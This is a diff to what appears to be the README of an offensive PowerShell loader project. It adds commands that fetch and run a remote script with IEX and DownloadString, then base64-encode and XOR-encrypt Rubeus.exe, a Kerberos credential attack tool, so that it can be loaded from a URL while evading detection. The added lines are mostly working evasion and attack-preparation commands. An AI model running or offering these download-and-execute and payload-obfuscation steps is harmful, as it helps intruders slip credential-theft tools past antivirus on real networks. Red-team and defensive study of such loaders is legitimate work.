@@ -154,6 +154,16 @@ Invoke-LoadAssemblyXOR -AssemblyUrl https://github.com/F4l13n5n0w/PowerSharpLoad
 ```
 
 To generate the XOR encrypted Rubeus.exe from powershell on Kali Linux:
+
+```
+IEX([Net.Webclient]::new().DownloadString("https://raw.githubusercontent.com/F4l13n5n0w/PowerSharpLoader/master/pwshxor.txt"));
+$path = "/var/www/html/test/Rubeus.exe";
+$EncodedData = [System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes($path));
+$enc_out = (xor $EncodedData "encrypt")
+$enc_out > rubeusxorb64.txt
+```
+
+For example:
 ```
 ┌──(root㉿average-student)-[/var/www/html/test]
 └─PS> Import-Module ./pwshxor.ps1
